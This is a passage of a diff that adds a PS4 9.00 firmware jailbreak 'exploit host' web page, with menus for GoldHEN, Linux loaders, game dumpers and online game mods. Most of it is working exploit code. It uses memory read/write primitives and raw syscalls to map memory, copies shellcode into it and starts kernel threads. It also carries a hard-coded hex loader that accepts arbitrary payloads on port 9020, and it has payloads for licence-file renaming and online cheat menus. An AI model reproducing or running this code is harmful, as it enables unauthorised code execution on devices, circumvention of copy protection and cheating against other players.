+        link.href = 'payload.html#f=WildeModz-1.46.js';
+        link.click();
+}
+
+function load_Oysters100(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.00.js';
+        link.click();
+}
+
+function load_Oysters113(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.13.js';
+        link.click();
+}
+
+function load_Oysters119(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.19.js';
+        link.click();
+}
+
+function load_Oysters124(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.24.js';
+        link.click();
+}
+
+function load_Oysters129(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.29.js';
+        link.click();
+}
+
+var jailbreak_start_date = localStorage.getItem("jailbreak_start_date");
+if (jailbreak_start_date !== null) {
+  localStorage.removeItem("jailbreak_start_date");
+}
+</script>
+</body>
+</html>
+
+        <button class="back-btn" onclick="hideContent('content750')">العودة إلى القائمة الرئيسية</button>
+    </div>
+
+    <div id="content900" class="content">
+        <h2>9.00 Exploit Host</h2>
+        <p>PS4 9.00 FW GOLDHEN</p>
+<!DOCTYPE html>
+<html>
+<head>
+<title>PS4 9.00 FW Host v4.0 by GamerHack | Psfree Auto Compressed</title>
+<script>
+if (window.applicationCache.status=='0'){window.location.replace("cache.html");}
+</script>
+<link rel="stylesheet" href="style.css">
+<script src="./int64.js"></script>
+<script src="./rop.js"></script>
+<script src="./kexploit.js"></script>
+<script type=module src="./alert.mjs"></script>
+</head>
+<body>
+<h1 id="msgs">PS4 9.00 FW Host v4.0 by GamerHack</h1>
+<hr>
+<br>
+<div id="progress">
+<h1 id="msgs2" style="font-size: 30px;margin-top: 77px;margin-bottom: 412px;">Loading Jailbreak... Please Wait</h1>
+</div>
+<div id="menu" style="display: none">
+<h1 style="font-size: 18px;color: yellow;">Main Payloads</h1>
+<button class="btn" onmouseover="msgs.innerHTML='GoldHEN v2.4b18.3 for 9.00 FW'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_goldhenbeta()"> GoldHEN v2.4b18.3 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GoldHEN v2.3 for 9.00 FW'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_goldhen23()"> GoldHEN v2.3 </button>
+<button class="btn" onmouseover="msgs.innerHTML='Send a Payload using port 9020'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_binloader()"> Bin Loader </button>
+<br>
+<h1 style="font-size: 18px;">Payloads</h1>
+<button class="btn" onmouseover="msgs.innerHTML='Dump Game Only to USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Gdumper()"> Game-Dumper </button>
+<button class="btn" onmouseover="msgs.innerHTML='Dump Update Only to USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Udumper()"> Update-Dumper </button>
+<button class="btn" onmouseover="msgs.innerHTML='Dump Separate Game and Update to USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_SGUdumper()"> SGU-Dumper </button>
+<button class="btn" onmouseover="msgs.innerHTML='Dump Merged Game and Update to USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_MGUdumper()"> MGU-Dumper </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Enable Some Debugging Functions Available on TestKit'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_todex()"> ToDex </button>
+<a href='/webactivator'><button class="btn" onmouseover="msgs.innerHTML='Activate Your User Account from the Console Browser'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'"> Web-Activator </button></a>
+<button class="btn" onmouseover="msgs.innerHTML='Access this console Through FTP (Be careful what you do)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_ftp()"> FTP </button>
+<button class="btn" onmouseover="msgs.innerHTML='Transfer Installed Games to USB Drive in exFAT'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_app2usb()"> App2USB </button>
+<button class="btn" onmouseover="msgs.innerHTML='Create a Backup of the Database and Users to a USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_dbackup()"> DB Backup </button>
+<button class="btn" onmouseover="msgs.innerHTML='Restore a Backup of the Database and Users from a USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_dbrestore()"> DB Restore </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Enable System Updates'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_enablebUpdates()"> Enable Updates </button>
+<button class="btn" onmouseover="msgs.innerHTML='Disable System Updates'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_disableUpdates()"> Disable Updates </button>
+<button class="btn" onmouseover="msgs.innerHTML='Enable/Disable Browser History.'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_historyBlocker()"> History Blocker </button>
+<button class="btn" onmouseover="msgs.innerHTML='Dump a Console Kernel to a USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_kernelDump()"> Kernel Dumper </button>
+<button class="btn" onmouseover="msgs.innerHTML='Dump a Kernel Module to a USB Drive'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_moduleDump()"> Module Dumper </button>
+<button class="btn" onmouseover="msgs.innerHTML='PS4 Debug for 9.00 FW'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_ps4debug()"> PS4 Debug </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Disables the ASLR (Address space layout randomization)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_disbAslr()"> Disable ASLR </button>
+<button class="btn" onmouseover="msgs.innerHTML='Disable IDU Mode if you have activated it by mistake'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_exitidu()"> Exit IDU </button>
+<button class="btn" onmouseover="msgs.innerHTML='Renames (fake) RIFs to (free) RIFs'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_rifRen()"> RIF Renamer </button>
+<button class="btn" onmouseover="msgs.innerHTML='Permanent UART for 9.00 FW'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_permUart()"> Permanent UART </button>
+<button class="btn" onmouseover="msgs.innerHTML='Required to Activate Cheats Through the PS4 Trainer Website'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_webrte()"> WebRTE </button>
+<a href="http://ps4trainer.com/Trainer/index.html"><button class="btn btn-onln" onmouseover="msgs.innerHTML='PS4 Trainer Website (Follow Instructions There)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'"> PS4 Trainer Web </button></a>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Linux Loaders Menu'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="linux_group()" style="margin-left: 69px"> Linux Loaders </button>
+<button class="btn" onmouseover="msgs.innerHTML='Games Mods'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="mods_group()"> Games-Mods </button>
+<button class="btn btn-toolbox" onmouseover="msgs.innerHTML='Orbis ToolBox Alpha 1190 for 9.00 FW'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_toolbox()"> Orbis-Toolbox </button>
+<button class="btn" onmouseover="msgs.innerHTML='Modify PS4 FAN Speed'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_fanthreshold()" style="margin-bottom: 70px"> Fan Threshold </button><select id="tempC"></select>°C
+</div>
+<div id="lnx">
+<h1 style="font-size: 18px;color: yellow;">Linux Payloads</h1>
+<button class="btn" onmouseover="msgs.innerHTML='Identify the Southbridge of your Console for the Linux Installation'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_southbridge()"> Whos that Southbridge </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 1GB VRAM (PSXita)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linux1gb()"> Linux 1GB - PSXita </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 2GB VRAM (PSXita)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linux2gb()"> Linux 2GB - PSXita </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 3GB VRAM (PSXita)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linux3gb()"> Linux 3GB - PSXita </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 4GB VRAM (PSXita)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linux4gb()"> Linux 4GB - PSXita </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 5GB VRAM (PSXita)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linux5gb()"> Linux 5GB - PSXita </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 1GB VRAM (Nazky)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linuxNazky1gb()"> Linux 1GB - Nazky </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 2GB VRAM (Nazky)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linuxNazky2gb()"> Linux 2GB - Nazky </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 3GB VRAM (Nazky)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linuxNazky3gb()"> Linux 3GB - Nazky </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 4GB VRAM (Nazky)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linuxNazky4gb()"> Linux 4GB - Nazky </button>
+<button class="btn" onmouseover="msgs.innerHTML='Load Linux with 5GB VRAM (Nazky)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_linuxNazky5gb()"> Linux 5GB - Nazky </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Return to Main Menu'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_menu()" style="margin-bottom: 241px"> Return </button>
+</div>
+<div id="mods">
+<h1 style="font-size: 18px;color: yellow;">Online Payloads</h1>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Arabic Guy v1.00 (L1 + R1)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_arabicGuy100()"> Arabic Guy v1.00 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Arabic Guy v1.27 (L1 + R1)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_arabicGuy127()"> Arabic Guy v1.27 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Arabic Guy v1.32 (L1 + R1)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_arabicGuy132()"> Arabic Guy v1.32 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Arabic Guy v1.33 (L1 + R1)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_arabicGuy133()"> Arabic Guy v1.33 </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Expulsion v4.0 - 1.38'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Expulsion()"> Expulsion v4.0 - 1.38 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Lamance v0.9 - 1.38 (Right + Square)'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Lamance()"> Lamance v0.9 - 1.38 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - WildeModz-1.48'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_WildeModz148()"> WildeModz-1.48 </button>
+<button class="btn" onmouseover="msgs.innerHTML='GTA V Mod - Beef Queef Mod v1.47'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_beefQueef147()"> Beef Queef Mod v1.47 </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Red Dead Redemption 2 Mod - Oysters Menu v1.00'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Oysters100()"> RDR2 v1.00 </button>
+<button class="btn" onmouseover="msgs.innerHTML='Red Dead Redemption 2 Mod - Oysters Menu v1.13'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Oysters113()"> RDR2 v1.13 </button>
+<button class="btn" onmouseover="msgs.innerHTML='Red Dead Redemption 2 Mod - Oysters Menu v1.19'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Oysters119()"> RDR2 v1.19 </button>
+<button class="btn" onmouseover="msgs.innerHTML='Red Dead Redemption 2 Mod - Oysters Menu v1.24'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Oysters124()"> RDR2 v1.24 </button>
+<button class="btn" onmouseover="msgs.innerHTML='Red Dead Redemption 2 Mod - Oysters Menu v1.29'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_Oysters129()"> RDR2 v1.29 </button>
+<br>
+<button class="btn" onmouseover="msgs.innerHTML='Return to Main Menu'" onmouseout="msgs.innerHTML='PS4 9.00 FW Host v4.0 by GamerHack'" onclick="load_menu()" style="margin-bottom: 241px"> Return </button>
+</div>
+<br>
+<h1 style="margin-top: 22px;">Special Thanks to:<a href="https://twitter.com/sleirsgoevy" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@sleirsgoevy</a>ChendoChap<a href="https://twitter.com/Znullptr" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@Znullptr</a>SiSTR0 abc</h1>
+<script>
+function jbdone(){
+document.getElementById("menu").style.display = "block";
+document.getElementById("progress").style.display = "none";
+}
+
+function linux_group(){
+document.getElementById("lnx").style.display = "block";
+document.getElementById("menu").style.display = "none";
+document.getElementById("progress").style.display = "none";
+}
+
+function mods_group(){
+document.getElementById("mods").style.display = "block";
+document.getElementById("menu").style.display = "none";
+document.getElementById("progress").style.display = "none";
+}
+
+function load_menu(){
+document.getElementById("menu").style.display = "block";
+document.getElementById("lnx").style.display = "none";
+document.getElementById("mods").style.display = "none";
+document.getElementById("progress").style.display = "none";
+}
+
+function allset(){
+msgs.innerHTML = LoadedMSG
+}
+
+  function loadFile(fileName) {
+    let xhr = new XMLHttpRequest();
+    xhr.open("GET", fileName, false);
+    xhr.overrideMimeType("text/plain; charset=x-user-defined");
+    xhr.send();
+    let array = Uint8Array.from(xhr.response, c => c.charCodeAt(0));
+    if (fileName.endsWith(".bz2")) {
+      try {
+        PLS = bzip2.simple(bzip2.array(array));
+      } catch(error) {
+        alert(fileName + ": \"" + error + "\"\n");
+        throw error;
+      }
+    }
+    return array;
+  }
+  
+function load_pocj() {
+var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x1002, -1, 0);
+            var buf = new Uint8Array(1);
+            var buf_addr = p.leakval(buf);
+            var old_buf = p.read8(buf_addr.add32(16));
+            var old_sz = p.read4(buf_addr.add32(24));
+            p.write8(buf_addr.add32(16), payload_buffer);
+            p.write4(buf_addr.add32(24), PLS.length);
+            for(var i = 0; i < PLS.length; i++) buf[i] = PLS[i];
+            p.write8(buf_addr.add32(16), old_buf);
+            p.write4(buf_addr.add32(24), old_sz);
+            var pthread = p.malloc(0x10);
+            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+            setTimeout(allset, 50);
+}
+
+function runScript(what)
+{
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', what, false);
+    xhr.send('');
+    eval.call(window, xhr.responseText);
+}
+
+function print(){}
+
+function load_poc2() {
+var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+ var payload_loader = p.malloc32(0x1000);
+ var BLDR = payload_loader.backing;
+ BLDR[0]=0x56415741;BLDR[1]=0x83485541;BLDR[2]=0x894818EC;BLDR[3]=0xC748243C;BLDR[4]=0x10082444;BLDR[5]=0x483C2302;BLDR[6]=0x102444C7;BLDR[7]=0x00000000;BLDR[8]=0x000002BF;BLDR[9]=0x0001BE00;BLDR[10]=0xD2310000;BLDR[11]=0x00009CE8;BLDR[12]=0xC7894100;BLDR[13]=0x8D48C789;BLDR[14]=0xBA082474;BLDR[15]=0x00000010;BLDR[16]=0x000095E8;BLDR[17]=0xFF894400;BLDR[18]=0x000001BE;BLDR[19]=0x0095E800;BLDR[20]=0x89440000;BLDR[21]=0x31F631FF;BLDR[22]=0x0062E8D2;BLDR[23]=0x89410000;BLDR[24]=0x2C8B4CC6;BLDR[25]=0x45C64124;BLDR[26]=0x05EBC300;BLDR[27]=0x01499848;BLDR[28]=0xF78944C5;BLDR[29]=0xBAEE894C;BLDR[30]=0x00001000;BLDR[31]=0x000025E8;BLDR[32]=0x7FC08500;BLDR[33]=0xFF8944E7;BLDR[34]=0x000026E8;BLDR[35]=0xF7894400;BLDR[36]=0x00001EE8;BLDR[37]=0x2414FF00;BLDR[38]=0x18C48348;BLDR[39]=0x5E415D41;BLDR[40]=0x31485F41;BLDR[41]=0xC748C3C0;BLDR[42]=0x000003C0;BLDR[43]=0xCA894900;BLDR[44]=0x48C3050F;BLDR[45]=0x0006C0C7;BLDR[46]=0x89490000;BLDR[47]=0xC3050FCA;BLDR[48]=0x1EC0C748;BLDR[49]=0x49000000;BLDR[50]=0x050FCA89;BLDR[51]=0xC0C748C3;BLDR[52]=0x00000061;BLDR[53]=0x0FCA8949;BLDR[54]=0xC748C305;BLDR[55]=0x000068C0;BLDR[56]=0xCA894900;BLDR[57]=0x48C3050F;BLDR[58]=0x006AC0C7;BLDR[59]=0x89490000;BLDR[60]=0xC3050FCA;
+ chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+ var pthread = p.malloc(0x10); {
+  chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
+  chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+ }
+ chain.run();
+ sessionStorage.Payload="yes";
+ setTimeout(load_pocl,2000);
+}
+
+function load_pocl() {
+var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x1002, -1, 0);
+            var buf = new Uint8Array(1);
+            var buf_addr = p.leakval(buf);
+            var old_buf = p.read8(buf_addr.add32(16));
+            var old_sz = p.read4(buf_addr.add32(24));
+            p.write8(buf_addr.add32(16), payload_buffer);
+            p.write4(buf_addr.add32(24), PLS.length);
+            for(var i = 0; i < PLS.length; i++) buf[i] = PLS[i];
+            p.write8(buf_addr.add32(16), old_buf);
+            p.write4(buf_addr.add32(24), old_sz);
+            var pthread = p.malloc(0x10);
+            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+            setTimeout(load_poc, 2000);
+}
+
+function load_poc(){
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET', PLfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   PLD = req.response;
+   var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
+   var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = p.malloc(0x10);
+   chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+   allset();
+  }
+ };
+}
+
+function load_binloader(){
+    var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    var payload_loader = p.malloc32(0x1000);
+    
+    var loader_writer = payload_loader.backing;
+    loader_writer[0] = 0x56415741;
+    loader_writer[1] = 0x83485541;
+    loader_writer[2] = 0x894818EC;
+    loader_writer[3] = 0xC748243C;
+    loader_writer[4] = 0x10082444;
+    loader_writer[5] = 0x483C2302;
+    loader_writer[6] = 0x102444C7;
+    loader_writer[7] = 0x00000000;
+    loader_writer[8] = 0x000002BF;
+    loader_writer[9] = 0x0001BE00;
+    loader_writer[10] = 0xD2310000;
+    loader_writer[11] = 0x00009CE8;
+    loader_writer[12] = 0xC7894100;
+    loader_writer[13] = 0x8D48C789;
+    loader_writer[14] = 0xBA082474;
+    loader_writer[15] = 0x00000010;
+    loader_writer[16] = 0x000095E8;
+    loader_writer[17] = 0xFF894400;
+    loader_writer[18] = 0x000001BE;
+    loader_writer[19] = 0x0095E800;
+    loader_writer[20] = 0x89440000;
+    loader_writer[21] = 0x31F631FF;
+    loader_writer[22] = 0x0062E8D2;
+    loader_writer[23] = 0x89410000;
+    loader_writer[24] = 0x2C8B4CC6;
+    loader_writer[25] = 0x45C64124;
+    loader_writer[26] = 0x05EBC300;
+    loader_writer[27] = 0x01499848;
+    loader_writer[28] = 0xF78944C5;
+    loader_writer[29] = 0xBAEE894C;
+    loader_writer[30] = 0x00001000;
+    loader_writer[31] = 0x000025E8;
+    loader_writer[32] = 0x7FC08500;
+    loader_writer[33] = 0xFF8944E7;
+    loader_writer[34] = 0x000026E8;
+    loader_writer[35] = 0xF7894400;
+    loader_writer[36] = 0x00001EE8;
+    loader_writer[37] = 0x2414FF00;
+    loader_writer[38] = 0x18C48348;
+    loader_writer[39] = 0x5E415D41;
+    loader_writer[40] = 0x31485F41;
+    loader_writer[41] = 0xC748C3C0;
+    loader_writer[42] = 0x000003C0;
+    loader_writer[43] = 0xCA894900;
+    loader_writer[44] = 0x48C3050F;
+    loader_writer[45] = 0x0006C0C7;
+    loader_writer[46] = 0x89490000;
+    loader_writer[47] = 0xC3050FCA;
+    loader_writer[48] = 0x1EC0C748;
+    loader_writer[49] = 0x49000000;
+    loader_writer[50] = 0x050FCA89;
+    loader_writer[51] = 0xC0C748C3;
+    loader_writer[52] = 0x00000061;
+    loader_writer[53] = 0x0FCA8949;
+    loader_writer[54] = 0xC748C305;
+    loader_writer[55] = 0x000068C0;
+    loader_writer[56] = 0xCA894900;
+    loader_writer[57] = 0x48C3050F;
+    loader_writer[58] = 0x006AC0C7;
+    loader_writer[59] = 0x89490000;
+    loader_writer[60] = 0xC3050FCA;
+    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+    var pthread = p.malloc(0x10);
+    //
+    {
+        chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
+        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+    }
+    chain.run();
+	LoadedMSG = "Bin Loader Launched ...";
+	alert("Waiting for Payload... Send it using the PS4 IP and port 9020");
+	allset();
+	}
+
+for(var i=50; i<=75; i=i+5){
+    var select = document.getElementById("tempC");
+    var option = document.createElement("OPTION");
+	select.options.add(option);
+	option.text = i;
+	option.value = i;
+}
+tempC.value=60;
+
+function load_linux1gb(){
+msgs.innerHTML="Loading Linux Loader 1GB... Please Wait";
+LoadedMSG = "Linux Loader 1GB Launched ...";
+PLfile = "payload-900-1gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linux2gb(){
+msgs.innerHTML="Loading Linux Loader 2GB... Please Wait";
+LoadedMSG = "Linux Loader 2GB Launched ...";
+PLfile = "payload-900-2gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linux3gb(){
+msgs.innerHTML="Loading Linux Loader 3GB... Please Wait";
+LoadedMSG = "Linux Loader 3GB Launched ...";
+PLfile = "payload-900-3gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linux4gb(){
+msgs.innerHTML="Loading Linux Loader 4GB... Please Wait";
+LoadedMSG = "Linux Loader 4GB Launched ...";
+PLfile = "payload-900-4gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linux5gb(){
+msgs.innerHTML="Loading Linux Loader 5GB... Please Wait";
+LoadedMSG = "Linux Loader 5GB Launched ...";
+PLfile = "payload-900-5gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linuxNazky1gb(){
+msgs.innerHTML="Loading Linux Loader 1GB... Please Wait";
+LoadedMSG = "Linux Loader 1GB Launched ...";
+PLfile = "linux-1gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linuxNazky2gb(){
+msgs.innerHTML="Loading Linux Loader 2GB... Please Wait";
+LoadedMSG = "Linux Loader 2GB Launched ...";
+PLfile = "linux-2gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linuxNazky3gb(){
+msgs.innerHTML="Loading Linux Loader 3GB... Please Wait";
+LoadedMSG = "Linux Loader 3GB Launched ...";
+PLfile = "linux-3gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linuxNazky4gb(){
+msgs.innerHTML="Loading Linux Loader 4GB... Please Wait";
+LoadedMSG = "Linux Loader 4GB Launched ...";
+PLfile = "linux-4gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_linuxNazky5gb(){
+msgs.innerHTML="Loading Linux Loader 5GB... Please Wait";
+LoadedMSG = "Linux Loader 5GB Launched ...";
+PLfile = "linux-5gb.bin";
+var script = document.createElement('script');script.src = "jbc_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
+if(sessionStorage.Payload!="yes"){setTimeout(load_poc2, 500);} else {load_poc();}
+}
+
+function load_goldhenbeta(){
+LoadedMSG = "GoldHEN v2.4b18.3 Loaded ...";
+PLfile = "goldhen_2.4b18.3.bin";
+load_poc();
+}
+
+function load_goldhen23(){
+LoadedMSG = "GoldHEN v2.3 Loaded ...";
+PLfile = "goldhen_2.3.bin";
+load_poc();
+}
+
+function load_Gdumper(){
+msgs.innerHTML="Loading Game-Dumper... Please Wait";
+LoadedMSG = "Game-Dumper Loaded ...";
+setTimeout(function(){let array = loadFile('dumperg.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_Udumper(){
+msgs.innerHTML="Loading Update-Dumper... Please Wait";
+LoadedMSG = "Update-Dumper Loaded ...";
+setTimeout(function(){let array = loadFile('dumperu.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_SGUdumper(){
+msgs.innerHTML="Loading Separate Game and Update Dumper... Please Wait";
+LoadedMSG = "Separate Game and Update Dumper Loaded ...";
+setTimeout(function(){let array = loadFile('dumpersgu.bin.bz2');}, 50);
+setTimeout(load_pocj, 500);
+}
+
+function load_MGUdumper(){
+msgs.innerHTML="Loading Merged Game and Update Dumper... Please Wait";
+LoadedMSG = "Merged Game and Update Dumper Loaded ...";
